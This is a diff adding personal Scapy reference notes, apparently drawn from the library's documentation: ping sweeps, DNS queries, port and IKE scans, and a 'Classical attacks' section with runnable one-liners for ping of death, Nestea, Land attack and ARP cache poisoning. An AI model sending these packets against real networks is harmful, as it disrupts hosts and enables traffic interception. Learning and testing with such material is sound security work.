@@ -9,6 +9,131 @@ s.send(b'test')
 banner = s.recv(1024)
 print(banner)
 s.close()
+----------------------
+
+TCP Ping
+In cases where ICMP echo requests are blocked, we can still use various TCP Pings such as TCP SYN Ping below:
+
+ans, unans = sr( IP(dst="192.168.1.0/24")/TCP(dport=80,flags="S") )
+Any response to our probes will indicate a live host. We can collect results with the following command:
+
+ans.summary( lambda s,r : r.sprintf("%IP.src% is alive") )
+UDP Ping
+If all else fails there is always UDP Ping which will produce ICMP Port unreachable errors from live hosts. Here you can pick any port which is most likely to be closed, such as port 0:
+
+ans, unans = sr( IP(dst="192.168.*.1-10")/UDP(dport=0) )
+Once again, results can be collected with this command:
+
+ans.summary( lambda s,r : r.sprintf("%IP.src% is alive") )
+DNS Requests
+IPv4 (A) request:
+
+This will perform a DNS request looking for IPv4 addresses
+
+ans = sr1(IP(dst="8.8.8.8")/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname="secdev.org",qtype="A")))
+ans.an.rdata
+'217.25.178.5'
+
+_____________________
+
+SOA request:
+
+ans = sr1(IP(dst="8.8.8.8")/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname="secdev.org",qtype="SOA")))
+ans.ns.mname
+b'dns.ovh.net.'
+ans.ns.rname
+b'tech.ovh.net.'
+_____________________
+
+MX request:
+
+ans = sr1(IP(dst="8.8.8.8")/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname="google.com",qtype="MX")))
+results = [x.exchange for x in ans.an.iterpayloads()]
+results
+[b'alt1.aspmx.l.google.com.',
+ b'alt4.aspmx.l.google.com.',
+ b'aspmx.l.google.com.',
+ b'alt2.aspmx.l.google.com.',
+ b'alt3.aspmx.l.google.com.']
+ ______________________
+
+ Classical attacks
+Malformed packets:
+
+send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP())
+Ping of death (Muuahahah):
+
+send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) )
+Nestea attack:
+
+send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
+send(IP(dst=target, id=42, frag=48)/("X"*116))
+send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))
+Land attack (designed for Microsoft Windows):
+
+send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
+ARP cache poisoning
+This attack prevents a client from joining the gateway by poisoning its ARP cache through a VLAN hopping attack.
+
+Classic ARP cache poisoning:
+
+send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
+      inter=RandNum(10,40), loop=1 )
+ARP cache poisoning with double 802.1q encapsulation:
+
+send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
+      /ARP(op="who-has", psrc=gateway, pdst=client),
+      inter=RandNum(10,40), loop=1 )
+TCP Port Scanning
+Send a TCP SYN on each port. Wait for a SYN-ACK or a RST or an ICMP error:
+
+res, unans = sr( IP(dst="target")
+                /TCP(flags="S", dport=(1,1024)) )
+Possible result visualization: open ports
+
+res.nsummary( lfilter=lambda s,r: (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
+IKE Scanning
+We try to identify VPN concentrators by sending ISAKMP Security Association proposals and receiving the answers:
+
+res, unans = sr( IP(dst="192.168.1.0/24")/UDP()
+                /ISAKMP(init_cookie=RandString(8), exch_type="identity prot.")
+                /ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal())
+              )
+Visualizing the results in a list:
+
+res.nsummary(prn=lambda s,r: r.src, lfilter=lambda s,r: r.haslayer(ISAKMP) )
+Advanced traceroute
+TCP SYN traceroute
+ans, unans = sr(IP(dst="4.2.2.1",ttl=(1,10))/TCP(dport=53,flags="S"))
+Results would be:
+
+ans.summary( lambda s,r: r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
+192.168.1.1     time-exceeded
+68.86.90.162    time-exceeded
+4.79.43.134     time-exceeded
+4.79.43.133     time-exceeded
+4.68.18.126     time-exceeded
+4.68.123.38     time-exceeded
+4.2.2.1         SA
+UDP traceroute
+
+
+----------------------
+
+import scapy.all as scapy
+  
+request = scapy.ARP()
+  
+request.pdst = 'x'
+broadcast = scapy.Ether()
+  
+broadcast.dst = 'ff:ff:ff:ff:ff:ff'
+  
+request_broadcast = broadcast / request
+clients = scapy.srp(request_broadcast, timeout = 1)[0]
+for element in clients:
+    print(element[1].psrc + "      " + element[1].hwsrc)
+    
 
 ----------------------
 
@@ -113,3 +238,7 @@ def thread_test(test_function):
 
 
 # thread_test(test_function)
+------------------------
+
+ns dir:
+	['__add__', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattr__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__len__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setstate__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', '__weakref__', '_elt2pkt', '_elt2show', '_elt2sum', 'afterglow', 'canvas_dump', 'conversations', 'convert_to', 'diffplot', 'display', 'filter', 'getlayer', 'hexdump', 'hexraw', 'listname', 'make_lined_table', 'make_table', 'make_tex_table', 'multiplot', 'nsummary', 'nzpadding', 'padding', 'pdfdump', 'plot', 'psdump', 'rawhexdump', 'replace', 'res', 'sessions', 'show', 'sr', 'stats', 'summary', 'svgdump', 'timeskew_graph']
